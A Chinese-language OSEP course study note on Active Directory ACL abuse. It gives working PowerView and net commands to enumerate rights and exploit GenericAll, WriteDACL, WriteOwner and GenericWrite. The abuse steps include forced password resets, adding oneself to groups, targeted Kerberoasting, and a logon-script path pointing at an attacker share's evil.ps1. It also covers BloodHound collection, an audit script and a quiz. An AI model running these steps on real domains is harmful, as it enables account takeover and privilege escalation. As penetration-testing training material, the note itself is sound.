---
title: OSEP-16-ACL枚举与滥用详解
description: '16-AD权限滥用 | 03-ACL枚举与滥用详解'
pubDate: 2026-01-30T00:02:34+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Active Directory
---

# AD 对象权限枚举与滥用详解

## 写在前面

本章详细讲解 Active Directory 对象权限的枚举和滥用技术，这是域渗透的核心技能。

---

## 一、DACL 和 ACE 基础

### 1.1 安全描述符定义语言 (SDDL)

```
ACE 字符串格式:
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid

示例:
(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)

解析:
├── A = ACCESS_ALLOWED_ACE_TYPE (允许)
├── 空 = 无 ace_flags
├── RPWPCCDCLCSWRCWDWOGA = 权限组合
├── 空 = 无 object_guid
├── 空 = 无 inherit_object_guid
└── S-1-1-0 = Everyone SID
```

### 1.2 权限代码对照表

| 代码 | 权限 | 说明 |
|------|------|------|
| GA | GENERIC_ALL | 完全控制 |
| GR | GENERIC_READ | 通用读取 |
| GW | GENERIC_WRITE | 通用写入 |
| GX | GENERIC_EXECUTE | 通用执行 |
| RC | READ_CONTROL | 读取安全描述符 |
| WD | WRITE_DAC | 修改 DACL |
| WO | WRITE_OWNER | 修改所有者 |
| RP | READ_PROPERTY | 读取属性 |
| WP | WRITE_PROPERTY | 写入属性 |
| CC | CREATE_CHILD | 创建子对象 |
| DC | DELETE_CHILD | 删除子对象 |
| SW | SELF_WRITE | 自我写入 |

---

## 二、使用 PowerView 枚举

### 2.1 基础枚举

```powershell
# 导入 PowerView
. .\PowerView.ps1

# 枚举特定用户的 ACL
Get-ObjectAcl -Identity offsec

# 解析 GUID 使输出更易读
Get-ObjectAcl -Identity offsec -ResolveGUIDs
```

### 2.2 转换 SID 到用户名

```powershell
# 转换单个 SID
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-553
# 输出: PROD\RAS and IAS Servers

# 批量转换并添加到输出
Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity `
        -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
    $_
}
```

### 2.3 查找当前用户的权限

```powershell
# 查找当前用户对所有域用户的权限
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity `
        -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
    $_
} | Foreach-Object {
    if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {
        $_
    }
}
```

### 2.4 查找对域组的权限

```powershell
# 查找当前用户对所有域组的权限
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity `
        -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
    $_
} | Foreach-Object {
    if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {
        $_
    }
}
```

---

## 三、GenericAll 权限滥用

### 3.1 对用户的 GenericAll

```powershell
# 发现对 TestService1 有 GenericAll 权限
# 输出示例:
# ObjectDN              : CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com
# ActiveDirectoryRights : GenericAll
# Identity              : PROD\offsec

# 利用方法 1: 直接修改密码
net user testservice1 NewP@ss123 /domain

# 利用方法 2: 使用 PowerShell
Set-ADAccountPassword -Identity testservice1 -Reset `
    -NewPassword (ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force)
```

### 3.2 对组的 GenericAll

```powershell
# 发现对 TestGroup 有 GenericAll 权限
# 利用: 将自己添加到组中
net group testgroup offsec /add /domain

# 或使用 PowerShell
Add-ADGroupMember -Identity "TestGroup" -Members "offsec"
```

### 3.3 类似权限

```
可以类似利用的权限:
├── GenericAll - 完全控制
├── GenericWrite - 写入所有属性
├── AllExtendedRights - 所有扩展权限
└── ForceChangePassword - 强制修改密码
```

---

## 四、WriteDACL 权限滥用

### 4.1 发现 WriteDACL

```powershell
# 枚举发现 WriteDACL 权限
# 输出示例:
# ObjectDN              : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com
# ActiveDirectoryRights : ReadProperty, GenericExecute, WriteDacl
# Identity              : PROD\offsec
```

### 4.2 添加 GenericAll 权限

```powershell
# 使用 PowerView 添加权限
Add-DomainObjectAcl -TargetIdentity testservice2 `
    -PrincipalIdentity offsec -Rights All

# 验证权限已添加
Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity `
        -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
    $_
} | Foreach-Object {
    if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {
        $_
    }
}
# 应该看到 ActiveDirectoryRights : GenericAll
```

### 4.3 利用新权限

```powershell
# 现在可以修改密码
net user testservice2 NewP@ss123 /domain
```

---

## 五、WriteOwner 权限滥用

### 5.1 修改对象所有者

```powershell
# 如果有 WriteOwner 权限，可以将自己设为所有者
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity offsec

# 所有者自动获得 WriteDACL 权限
# 然后可以添加 GenericAll
Add-DomainObjectAcl -TargetIdentity targetuser `
    -PrincipalIdentity offsec -Rights All
```

---

## 六、GenericWrite 权限滥用

### 6.1 修改用户属性

```powershell
# GenericWrite 允许修改对象属性
# 可以修改 scriptPath 属性执行恶意脚本
Set-DomainObject -Identity targetuser -Set @{scriptpath="\\attacker\share\evil.ps1"}
```

### 6.2 Kerberoasting 攻击

```powershell
# 如果对用户有 GenericWrite，可以设置 SPN
# 然后进行 Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname="fake/spn"}

# 请求服务票据
Get-DomainSPNTicket -Identity targetuser
```

---

## 七、使用 BloodHound 自动化

### 7.1 收集数据

```powershell
# 使用 SharpHound.ps1
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp

# 或使用 SharpHound.exe
.\SharpHound.exe -c All
```

### 7.2 分析攻击路径

```
BloodHound 可以发现:
├── 从当前用户到 Domain Admins 的路径
├── 可利用的 ACL 配置错误
├── Kerberos 委派配置
├── 组成员关系
└── 会话信息
```

---

## 八、完整攻击流程

### 8.1 枚举阶段

```powershell
# 1. 导入 PowerView
. .\PowerView.ps1

# 2. 枚举当前用户对所有用户的权限
$results = Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity `
        -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
    $_
} | Where-Object {
    $_.Identity -eq $("$env:UserDomain\$env:Username") -and
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"
}

# 3. 显示结果
$results | Select-Object ObjectDN, ActiveDirectoryRights
```

### 8.2 利用阶段

```powershell
# 根据发现的权限选择利用方法

# GenericAll -> 直接修改密码
net user targetuser NewP@ss /domain

# WriteDACL -> 先添加 GenericAll，再修改密码
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity offsec -Rights All
net user targetuser NewP@ss /domain

# WriteOwner -> 先修改所有者，再添加权限
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity offsec
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity offsec -Rights All
net user targetuser NewP@ss /domain
```

---

## 九、防御措施

### 9.1 权限审计

```powershell
# 定期审计敏感对象的 ACL
Get-ADUser -Filter * | ForEach-Object {
    $acl = Get-Acl "AD:$($_.DistinguishedName)"
    $acl.Access | Where-Object {
        $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"
    } | ForEach-Object {
        [PSCustomObject]@{
            User = $_.IdentityReference
            Rights = $_.ActiveDirectoryRights
            Target = $_.ObjectDN
        }
    }
}
```

### 9.2 最小权限原则

```
安全建议:
├── 避免给普通用户过多权限
├── 定期审查 ACL 配置
├── 使用 BloodHound 检测攻击路径
├── 监控权限变更
└── 实施特权访问管理 (PAM)
```

---

## 十、练习题

### 选择题

1. GenericAll 权限允许什么操作？
   - A) 只读访问
   - B) 完全控制
   - C) 只能修改密码
   - D) 只能读取属性

2. WriteDACL 权限的主要用途是？
   - A) 修改对象属性
   - B) 修改访问控制列表
   - C) 删除对象
   - D) 创建子对象

3. 如何利用 WriteOwner 权限？
   - A) 直接修改密码
   - B) 先修改所有者，再添加权限
   - C) 删除对象
   - D) 无法利用

4. PowerView 中哪个函数用于枚举 ACL？
   - A) Get-DomainUser
   - B) Get-ObjectAcl
   - C) Get-DomainGroup
   - D) Get-DomainComputer

5. BloodHound 的主要用途是？
   - A) 密码破解
   - B) 攻击路径分析
   - C) 网络扫描
   - D) 漏洞扫描

### 答案

1-B, 2-B, 3-B, 4-B, 5-B

---

## 十一、总结

### 关键要点

✅ AD 对象权限配置错误是常见漏洞
✅ GenericAll、WriteDACL、WriteOwner 是最危险的权限
✅ PowerView 是枚举 ACL 的强大工具
✅ BloodHound 可以自动发现攻击路径
✅ 定期审计是防御的关键

### 攻击链

```
枚举 ACL
    ↓
发现危险权限
    ↓
利用权限 (修改 DACL/密码/组成员)
    ↓
获得目标账户控制
    ↓
横向移动或权限提升
```

---

## 下一步

继续学习 [04-Kerberos委派攻击.md](/blog/osep/16-ad权限滥用/04-kerberos委派攻击/)，了解如何利用委派配置进行攻击。
